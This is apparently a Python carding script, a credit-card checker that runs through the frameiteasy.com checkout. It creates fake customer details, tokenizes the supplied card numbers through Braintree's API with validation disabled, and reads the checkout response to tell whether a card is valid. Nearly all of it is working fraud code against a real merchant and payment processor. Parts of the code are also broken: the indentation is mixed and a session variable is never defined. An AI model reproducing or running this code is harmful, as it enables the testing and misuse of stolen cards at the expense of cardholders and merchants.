import requests
import random
import string
import re
from bs4 import BeautifulSoup
import json
import time
import base64
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import unquote
import cloudscraper
import os
from urllib.parse import urlparse, parse_qs
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
        
	characters = string.ascii_letters
        number = string.digits
        mail = ''.join(random.choice(characters + number) for _ in range(7))
        email = f"{mail}@gmail.com"
        name1 = ''.join(random.choice(characters + characters) for _ in range (7))
        name2 = ''.join(random.choice(characters + characters) for _ in range (7))
        nombre = name1+ " " + name2

        url = "https://www.frameiteasy.com/"
	headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    response = session.get(url, headers=headers)
    token_match = re.search(r'name="token" type="hidden" value="([^"]+)"', response.text)
    token = token_match.group(1)
    time.sleep(30)
    url = "https://www.frameiteasy.com/ajax.php"

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    data = {
        'token': token,
        'action': 'add_to_cart',
        'quantity': '1',
        'item_id': 'null',
    }

    response = session.post(url, headers=headers, data=data)
    time.sleep(30)
    url = "https://www.frameiteasy.com/cart"

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    response = session.get(url, headers=headers)
    time.sleep(30)
    url = "https://www.frameiteasy.com/checkout"

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    response = session.get(url, headers=headers)
    time.sleep(30)
    url = "https://www.frameiteasy.com/checkout"

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'es-419,es;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': '_fbp=fb.1.1705876202686.657726597; _gcl_au=1.1.1683125604.1705876203; _ga=GA1.1.234448392.1705876204; _pin_unauth=dWlkPU1tVTJNMk0zT1RndE4yTTROeTAwWm1RNUxUazJOamN0WXpneU0yVTRPVGMzT0RKbQ; PHPSESSID=abc7082afe749fc0bc179c165ac9adc2; _hjSessionUser_1242907=eyJpZCI6IjY4MDRlNGFlLWJiOWEtNTllYS05MzVhLTU1ODQ3MGJmOGI3OSIsImNyZWF0ZWQiOjE3MDU4NzYyMDM5NjksImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_1242907=eyJpZCI6IjI1ZmJiZTQ5LTFkZjMtNGU1Mi1hNGMyLTUyYjdhNDdhMjRkZiIsImMiOjE3MDY2MDk0MTU3NTYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; _derived_epik=dj0yJnU9MWJ2aFRGYnhnM1NiVW10S3pyUGpSOFVPWTN2TjNQZXUmbj1JNHhoZjh2YXRjMV9ZZ09idFZqeGFnJm09MTAmdD1BQUFBQUdXXzdEVSZybT0xMCZydD1BQUFBQUdXXzdEVSZzcD0x; order_in_progress_id=75351e6619bc9b6d929e476802acfdb904fcb3f2; __kla_id=eyJjaWQiOiJNV013TXpkaE1UVXRaVEV5TUMwME5XRXlMV0l3WkdJdE0ySTNPREkwWlRWbU9UWm0iLCIkcmVmZXJyZXIiOnsidHMiOjE3MDU4NzYyMDMsInZhbHVlIjoiaHR0cHM6Ly93d3cuZnJhbWVpdGVhc3kuY29tL2NoZWNrb3V0IiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmZyYW1laXRlYXN5LmNvbS8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE3MDY2MTI2MDgsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmZyYW1laXRlYXN5LmNvbS8ifX0=; _uetsid=c308c900bf5711eea2d9ffd7ef36a112|pne4ii|2|fiu|0|1495; _uetvid=9ec53ab0b8ac11ee917a0f2b41b62881|1t4ew8f|1706612610421|16|1|bat.bing.com/p/insights/c/t; _ga_P7NH79EWSK=GS1.1.1706609414.2.1.1706612626.10.0.0',
        'Origin': 'https://www.frameiteasy.com',
        'Referer': 'https://www.frameiteasy.com/checkout',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'override_shipping_address': '',
        'email': email,
        'billing_full_name': nombre,
        'phone': '7045454545',
        'password_1': '',
        'password_2': '',
        'shipping_full_name': nombre,
        'shipping_address_1': '20 Broad Street',
        'shipping_address_2': '',
        'shipping_company': '',
        'shipping_city': 'New York',
        'shipping_state': 'NY',
        'shipping_zip': '10005',
        'code': '',
        'pin': '',
        'checkout_form': 'true',
        'token': token,
    }

    response = session.post(url, headers=headers, data=data)
    token_client_match = re.search(r'var client_token = "([^"]+)"', response.text)
    valor_clientoken = token_client_match.group(1) if token_client_match else None
    decode_tok = base64.b64decode(valor_clientoken).decode('utf-8')
    auth_toke = json.loads(decode_tok).get('authorizationFingerprint')
    auth = auth_toke if auth_toke else None
    time.sleep(30)
    url = "https://payments.braintree-api.com/graphql"

    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.9',
        'authorization': f'Bearer {auth}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': 'd9310611-2894-479b-875a-36954688e219',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = session.post(url, headers=headers, json=json_data)
    tokenoce = json.loads(response.text).get('data', {}).get('tokenizeCreditCard', {}).get('token')
    brandCode = json.loads(response.text).get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('brandCode')
    Bin = json.loads(response.text).get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('bin')
    last4 = json.loads(response.text).get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('last4')
    time.sleep(30)
    url = "https://www.frameiteasy.com/ajax.php"

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    data = {
        'token': token,
        'action': 'set_customer_payment',
        'nonce': tokenoce,
        'type': 'CreditCard',
        'card_type': 'Visa',
        'card_last_two': '31',
        'device_data': '{"correlation_id":"cf167f311d933d5ef307c29fc6c78007"}',
    }

    response = session.post(url, headers=headers, data=data)
    time.sleep(30)
    url = "https://www.frameiteasy.com/checkout"

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'es-419,es;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': '_fbp=fb.1.1705876202686.657726597; _gcl_au=1.1.1683125604.1705876203; _ga=GA1.1.234448392.1705876204; _pin_unauth=dWlkPU1tVTJNMk0zT1RndE4yTTROeTAwWm1RNUxUazJOamN0WXpneU0yVTRPVGMzT0RKbQ; PHPSESSID=abc7082afe749fc0bc179c165ac9adc2; _hjSessionUser_1242907=eyJpZCI6IjY4MDRlNGFlLWJiOWEtNTllYS05MzVhLTU1ODQ3MGJmOGI3OSIsImNyZWF0ZWQiOjE3MDU4NzYyMDM5NjksImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_1242907=eyJpZCI6IjI1ZmJiZTQ5LTFkZjMtNGU1Mi1hNGMyLTUyYjdhNDdhMjRkZiIsImMiOjE3MDY2MDk0MTU3NTYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; _derived_epik=dj0yJnU9MWJ2aFRGYnhnM1NiVW10S3pyUGpSOFVPWTN2TjNQZXUmbj1JNHhoZjh2YXRjMV9ZZ09idFZqeGFnJm09MTAmdD1BQUFBQUdXXzdEVSZybT0xMCZydD1BQUFBQUdXXzdEVSZzcD0x; order_in_progress_id=75351e6619bc9b6d929e476802acfdb904fcb3f2; _uetsid=c308c900bf5711eea2d9ffd7ef36a112|pne4ii|2|fiu|0|1495; __kla_id=eyJjaWQiOiJNV013TXpkaE1UVXRaVEV5TUMwME5XRXlMV0l3WkdJdE0ySTNPREkwWlRWbU9UWm0iLCIkcmVmZXJyZXIiOnsidHMiOjE3MDU4NzYyMDMsInZhbHVlIjoiaHR0cHM6Ly93d3cuZnJhbWVpdGVhc3kuY29tL2NoZWNrb3V0IiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmZyYW1laXRlYXN5LmNvbS8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE3MDY2MTI2MzksInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmZyYW1laXRlYXN5LmNvbS8ifSwiJGZpcnN0X25hbWUiOiJqdWFuIiwiJGxhc3RfbmFtZSI6IkxQIiwiJGV4Y2hhbmdlX2lkIjoidWcyNkhZN0NWSjFGeTk4WmViaE5BVGIyMHl4SFdhc1l1VFlPWmQ0X2tpUT0uVGdnVXRTIn0=; _uetvid=9ec53ab0b8ac11ee917a0f2b41b62881|1t4ew8f|1706613653699|18|1|bat.bing.com/p/insights/c/t; _ga_P7NH79EWSK=GS1.1.1706609414.2.1.1706613673.60.0.0',
        'Origin': 'https://www.frameiteasy.com',
        'Referer': 'https://www.frameiteasy.com/checkout',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'checkout_step': '2',
        'billing_address_1': '',
        'billing_address_2': '',
        'billing_company': '',
        'billing_city': '',
        'billing_state': '',
        'billing_zip': '',
        'earliest_delivery_estimate': '1707368400',
        'latest_delivery_estimate': '1707800399',
        'gift_note': '',
        'email_list_opt_in': 'on',
        'how_did_you_hear': '',
        'terms_and_conditions': 'true',
        'code': '',
        'pin': '',
        'checkout_form': 'true',
        'token': token,
    }

    response = session.post(url, headers=headers, data=data)
    time.sleep(30)
    msg = re.findall(r'<li>(.*?)</li>', response.text, re.DOTALL)
	
                print(response)
	try:
		ii=response['validation_feedback']
	except:
		return 'success'
	return ii
